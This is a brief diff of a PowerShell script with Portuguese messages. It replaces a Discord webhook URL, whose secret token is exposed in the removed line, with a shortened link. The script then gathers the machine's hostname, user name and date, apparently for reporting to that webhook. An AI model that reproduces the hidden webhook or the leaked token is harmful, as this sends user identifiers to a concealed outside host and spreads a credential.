@@ -10,8 +10,9 @@ function Pause-Script {
     Write-Host "`n[+] - Finalizado. Pressione para sair..." -ForegroundColor White
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
+
 #Webhook
-$webhookUrl = "https://discord.com/api/webhooks/1381300641246216232/mje4feLPAihgb-G8GJWA0bob8NLLtUptUtoyMxSFibiLdOwyBdMHTHDjmvO8YSjDISba"
+$webhookUrl = "https://encurtador.com.br/CbWDy"
 $hostname = $env:COMPUTERNAME
 $username = $env:USERNAME
 $date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
